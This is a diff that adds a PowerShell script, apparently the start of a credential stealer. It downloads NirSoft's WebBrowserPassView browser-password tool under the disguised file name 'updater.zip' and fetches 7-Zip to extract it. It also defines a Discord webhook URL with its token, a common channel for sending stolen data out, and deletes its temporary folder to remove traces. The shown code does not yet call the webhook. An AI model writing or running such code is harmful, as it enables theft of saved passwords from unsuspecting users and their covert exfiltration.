@@ -1,0 +1,17 @@
+function Get {
+  mkdir \temp 
+  cd \temp
+  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile updater.zip
+  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+  Expand-Archive 7z.zip 
+  .\7z\7za.exe e updater.zip
+}
+
+function Discord {
+$DiscordUrl = 'https://discord.com/api/webhooks/1206120501471223828/xQpZHvLb0aphdEIsp5QuPnZpbN5WCbH5ZlQqz-UuwyKQxltZb3y3pmDBJkd7jFXbrMU2'
+}
+
+function Del-Nirsoft-File {
+  cd C:\
+  rmdir -R \temp
+}
